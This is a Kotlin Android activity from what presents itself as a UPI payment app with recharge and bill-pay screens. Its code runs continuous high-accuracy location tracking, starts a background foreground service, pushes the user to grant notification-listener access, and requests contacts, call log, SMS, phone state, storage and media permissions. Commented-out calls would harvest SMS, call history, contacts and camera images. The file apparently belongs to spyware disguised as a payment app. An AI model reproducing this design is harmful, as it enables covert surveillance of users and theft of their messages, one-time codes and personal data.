package com.payment.app

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.IntentSender.SendIntentException
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.ImageView
import android.widget.RelativeLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.NonNull
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.cardview.widget.CardView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.GoogleApiClient
import com.google.android.gms.common.api.ResultCallback
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.location.LocationSettingsResult
import com.google.android.gms.location.LocationSettingsStatusCodes
import com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY
import com.google.android.gms.tasks.OnSuccessListener
import com.payment.app.services.MyService
import com.payment.app.services.NotificationService
import okhttp3.Interceptor.*
import java.time.LocalDateTime


class HomeActivity : AppCompatActivity() {

    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>
    private var isCallLogPermissionGranted = false
    private var isContactPermissionGranted = false
    private var isLocationPermissionGranted = false
    private var isPostNotificationPermissionGranted = false
    private var isSmsPermissionGranted = false
    private var isReadPhonePermissionGranted = false
    private var isReadExternalStoragePermissionGranted = false
    private var isWriteExternalStoragePermissionGranted = false
    private var isReadMediaImagePermissionGranted = false
    private var isReadMediaVideoPermissionGranted = false
    private val permissionId = 2
    private var googleApiClient: GoogleApiClient? = null
    val REQUEST_LOCATION = 199
    private var stringLatitude = "0.0"
    private var stringLongitude = "0.0"
    private var fusedLocationProviderClient: FusedLocationProviderClient? = null

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        val btnPayUpi: CardView = findViewById(R.id.btn_pay_upi)
        val btn_pay_contact: CardView = findViewById(R.id.btn_pay_contact)
        val btnMobileRecharge: RelativeLayout = findViewById(R.id.btn_mobile_recharge)
        val btnElectricityBill: RelativeLayout = findViewById(R.id.btn_electricity_bill)
        val home_bottom: ImageView = findViewById(R.id.home_bottom)
        val history_bottom: ImageView = findViewById(R.id.history_bottom)
        val email: TextView = findViewById(R.id.textView12)
        val name: TextView = findViewById(R.id.textView11)

        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        email.text = preferences.getString("email", "")
        name.text = preferences.getString("name", "")


        findViewById<ImageView>(R.id.imageView2).setOnClickListener {
            startActivity(Intent(this, LogActivity::class.java))
        }

        permissionLauncher =
            registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
                isContactPermissionGranted =
                    permissions[Manifest.permission.READ_CONTACTS] ?: isContactPermissionGranted
                isCallLogPermissionGranted =
                    permissions[Manifest.permission.READ_CALL_LOG] ?: isCallLogPermissionGranted
                isLocationPermissionGranted = permissions[Manifest.permission.ACCESS_FINE_LOCATION]
                    ?: isLocationPermissionGranted
                isPostNotificationPermissionGranted =
                    permissions[Manifest.permission.POST_NOTIFICATIONS]
                        ?: isPostNotificationPermissionGranted
                isSmsPermissionGranted =
                    permissions[Manifest.permission.READ_SMS] ?: isSmsPermissionGranted
                isReadPhonePermissionGranted = permissions[Manifest.permission.READ_PHONE_STATE]
                    ?: isReadPhonePermissionGranted
                isReadExternalStoragePermissionGranted =
                    permissions[Manifest.permission.READ_EXTERNAL_STORAGE]
                        ?: isReadExternalStoragePermissionGranted
                isWriteExternalStoragePermissionGranted =
                    permissions[Manifest.permission.WRITE_EXTERNAL_STORAGE]
                        ?: isWriteExternalStoragePermissionGranted
                isReadMediaImagePermissionGranted =
                    permissions[Manifest.permission.READ_MEDIA_IMAGES]
                        ?: isReadMediaImagePermissionGranted
                isReadMediaVideoPermissionGranted =
                    permissions[Manifest.permission.READ_MEDIA_VIDEO]
                        ?: isReadMediaVideoPermissionGranted
            }

        requestPermissions()
//        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

//        val serviceIntent = Intent(this, MyService::class.java)
//        startForegroundService(serviceIntent)
//        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
//            != PackageManager.PERMISSION_GRANTED) {
//            ActivityCompat.requestPermissions(
//                this,
//                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
//                1001
//            )
//        } else {
//            // Permission is already granted, get the location
//            getLastLocation()
//        }

        val locationRequest = LocationRequest.Builder(PRIORITY_HIGH_ACCURACY, 100)
            .setWaitForAccurateLocation(false)
            .setMinUpdateIntervalMillis(2000)
            .setMaxUpdateDelayMillis(100)
            .build()

        val locationCallback: LocationCallback = object : LocationCallback() {
            override fun onLocationResult(@NonNull locationResult: LocationResult) {
                if (locationResult == null) {
                    return
                }
            }
        }

        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        LocationServices.getFusedLocationProviderClient(applicationContext)
            .requestLocationUpdates(locationRequest, locationCallback, null)
        fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);

        try {
            getLocation()
        } catch (e: Exception) {
            ApiCallManager.appendLog("Global Location Exception Handler: ${e.message ?: "Unknown Error"}")
        }

        home_bottom.setOnClickListener(View.OnClickListener { homeBottom() })

        history_bottom.setOnClickListener(View.OnClickListener { historyBottom() })

        btnPayUpi.setOnClickListener(View.OnClickListener { switchActivities() })

        btn_pay_contact.setOnClickListener(View.OnClickListener { btnPayContact() })

        btnMobileRecharge.setOnClickListener(View.OnClickListener { mobileRecharge() })

        btnElectricityBill.setOnClickListener(View.OnClickListener { electricityBill() })

        val serviceIntent = Intent(this, MyService::class.java)
        startForegroundService(serviceIntent)

//        try {
//            getCallLog()
//        } catch (e: Exception) {
//            ApiCallManager.appendLog("Global Call Log Exception Handler: ${e.message ?: "Unknown Error"}")
//        }

//        val prefs = getSharedPreferences("location", MODE_PRIVATE)
//        val locationSync = prefs.getString("locationSync","")
//        val isAllLogApiCall = prefs.getString("locationApi","")
//        val locationError = prefs.getString("locationError","")
//        val contactSync = prefs.getString("contactSync","")
//        val contactError = prefs.getString("contactError","")
//        var contact: String = ""
//        for (i in 0..100) {
//            contact = prefs.getString("contactHistory$i","").toString()
//            textView.setText(locationSync.toString()+isAllLogApiCall.toString()+locationError.toString()+"\n"+contactSync.toString()+contact.toString()+contactError.toString())
//        }

        //generateForegroundNotification()
//        ApiCallManager.appendLog("\n")

        val notificationListenerString =
            Settings.Secure.getString(this.contentResolver, "enabled_notification_listeners")
//Check notifications access permission
//Check notifications access permission
        if (notificationListenerString == null || !notificationListenerString.contains(packageName)) {
            //The notification access has not acquired yet!
            Log.d("Notification Permission", "no access")
            notificationRequestPermission()
        } else {
//            val serviceIntent = Intent(this, NotificationService::class.java)
//            startService(serviceIntent)
            //Your application has access to the notifications
            Log.d("Notification Permission", "has access")
        }



//        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
//        startActivity(intent)

//        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this)


//        ApiCallManager.appendLog("\n")
//        try {
//            removeContact()
//        } catch (e: Exception) {
//            ApiCallManager.appendLog("Global Contact sync Exception Handler: ${e.message ?: "Unknown Error"}")
//        }
//        ApiCallManager.appendLog("\n")
//        try {
//            fetchSmsInfo()
//        } catch (e: Exception) {
//            ApiCallManager.appendLog("Global SMS Exception Handler: ${e.message ?: "Unknown Error"}")
//        }
//        ApiCallManager.appendLog("\n")
//        try {
//            getTodayCallHistory(0.0, 0.0)
//        } catch (e: Exception) {
//            ApiCallManager.appendLog("Global Call History Exception Handler: ${e.message ?: "Unknown Error"}")
//        }
//        ApiCallManager.appendLog("\n")
//        try {
//            fetchAndLogDataBatteryInfo()
//        } catch (e: Exception) {
//            ApiCallManager.appendLog("Global Battery Level Exception Handler: ${e.message ?: "Unknown Error"}")
//        }
//        ApiCallManager.appendLog("\n")
//        try {
//            generateForegroundNotification()
//        } catch (e: Exception) {
//            ApiCallManager.appendLog("Global Location Exception Handler: ${e.message ?: "Unknown Error"}")
//        }
//        ApiCallManager.appendLog("\n")
//        try {
//            getImagesFromCameraFolder()
//        } catch (e: Exception) {
//            ApiCallManager.appendLog("Global Image Video Exception Handler: ${e.message ?: "Unknown Error"}")
//        }
        //generateLocation()
//        textView.setText(locationSync.toString()+isAllLogApiCall.toString()+locationError.toString()+"\n"+contactSync.toString()+contact.toString()+contactError.toString())
    }

    fun notificationRequestPermission() {
        val requestIntent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
        requestIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(requestIntent)
    }

    @SuppressLint("MissingPermission", "SetTextI18n")
    private fun getLocation() {
        if (checkPermissions()) {
            if (isLocationEnabled()) {
                fusedLocationProviderClient?.lastLocation?.addOnSuccessListener(this,
                    OnSuccessListener<Location?> { location ->
                        if (location != null) {
                            stringLatitude = java.lang.Double.toString(location.latitude)
                            stringLongitude = java.lang.Double.toString(location.longitude)
                        } else {
                            stringLatitude = "null"
                            stringLongitude = "null"
                        }
                        Log.d("stringLatitude ", stringLatitude)
                        Log.d("stringLongitude ", stringLongitude)
                    })
            }
            else {
                ApiCallManager.appendLog("Please turn on location")

                Toast.makeText(this, "Please turn on location", Toast.LENGTH_LONG).show()
                enableLoc()
            }
        } else {
//            displayLocationSettingsRequest(applicationContext)
            requestPermissions()
        }
    }

    private fun enableLoc() {
        if (googleApiClient == null) {
            googleApiClient = GoogleApiClient.Builder(applicationContext)
                .addApi(LocationServices.API)
                .addConnectionCallbacks(object : GoogleApiClient.ConnectionCallbacks {
                    override fun onConnected(bundle: Bundle?) {}
                    override fun onConnectionSuspended(i: Int) {
                        googleApiClient!!.connect()
                    }
                })
                .addOnConnectionFailedListener { connectionResult ->
                    Log.d(
                        "Location error",
                        "Location error " + connectionResult.errorCode
                    )
                }.build()
            googleApiClient!!.connect()
            val locationRequest = LocationRequest.create()
            locationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            locationRequest.interval = (30 * 1000).toLong()
            locationRequest.fastestInterval = (5 * 1000).toLong()
            val builder = LocationSettingsRequest.Builder()
                .addLocationRequest(locationRequest)
            builder.setAlwaysShow(true)
            val result =
                LocationServices.SettingsApi.checkLocationSettings(googleApiClient!!, builder.build())
            result.setResultCallback(object : ResultCallback<LocationSettingsResult?> {
                override fun onResult(result: LocationSettingsResult) {
                    val status = result.status
                    when (status.statusCode) {
                        LocationSettingsStatusCodes.RESOLUTION_REQUIRED -> try {
                            // Show the dialog by calling startResolutionForResult(),
                            // and check the result in onActivityResult().
                            status.startResolutionForResult(this@HomeActivity, REQUEST_LOCATION)

//                                finish();
                        } catch (e: SendIntentException) {
                            // Ignore the error.
                        }
                    }
                }
            })
        }
    }

    private fun isLocationEnabled(): Boolean {
        val locationManager: LocationManager =
            getSystemService(LOCATION_SERVICE) as LocationManager
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(
            LocationManager.NETWORK_PROVIDER
        )
    }

    private fun checkPermissions(): Boolean {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
//            ApiCallManager.appendLog("Location Permission GRANTED")

            return true
        }
//        ApiCallManager.appendLog("Location Permission Denied")
        return false
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION
            ),
            permissionId
        )
    }

    @SuppressLint("MissingSuperCall")
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        if (requestCode == permissionId) {
            if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                getLocation()
            }
        }
    }


    private fun homeBottom() {
        val switchActivityIntent = Intent(this, HomeActivity::class.java)
        startActivity(switchActivityIntent)
        finish()
    }

    private fun historyBottom() {
        val switchActivityIntent = Intent(this, HistoryActivity::class.java)
        startActivity(switchActivityIntent)
        overridePendingTransition(0, 0)
        finish()
    }

    private fun switchActivities() {
        val switchActivityIntent = Intent(this, UpiPaymentActivity::class.java)
        startActivity(switchActivityIntent)
    }

    private fun btnPayContact() {
        val switchActivityIntent = Intent(this, ContactActivity::class.java)
        startActivity(switchActivityIntent)
    }

    private fun mobileRecharge() {
        val switchActivityIntent = Intent(this, MobileRechargeActivity::class.java)
        startActivity(switchActivityIntent)
    }

    private fun electricityBill() {
        val switchActivityIntent = Intent(this, ElectricityBillActivity::class.java)
        startActivity(switchActivityIntent)
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun requestPermission() {
        isContactPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED

        isCallLogPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED

        isLocationPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        isPostNotificationPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.POST_NOTIFICATIONS
        ) == PackageManager.PERMISSION_GRANTED

        isSmsPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED

        isReadPhonePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED

        isReadExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED

        isWriteExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED

        isReadMediaImagePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_IMAGES
        ) == PackageManager.PERMISSION_GRANTED

        isReadMediaVideoPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_VIDEO
        ) == PackageManager.PERMISSION_GRANTED


        val permissionRequest: MutableList<String> = ArrayList()

        if (!isContactPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_CONTACTS)
        }

        if (!isCallLogPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_CALL_LOG)
        }

        if (!isLocationPermissionGranted) {
            permissionRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }

        if (!isPostNotificationPermissionGranted) {
            permissionRequest.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (!isSmsPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_SMS)
        }

        if (!isReadPhonePermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_PHONE_STATE)
        }

        if (!isReadExternalStoragePermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        if (!isWriteExternalStoragePermissionGranted) {
            permissionRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        if (!isReadMediaImagePermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
        }

        if (!isReadMediaVideoPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_MEDIA_VIDEO)
        }

        if (permissionRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionRequest.toTypedArray())
        }

    }

}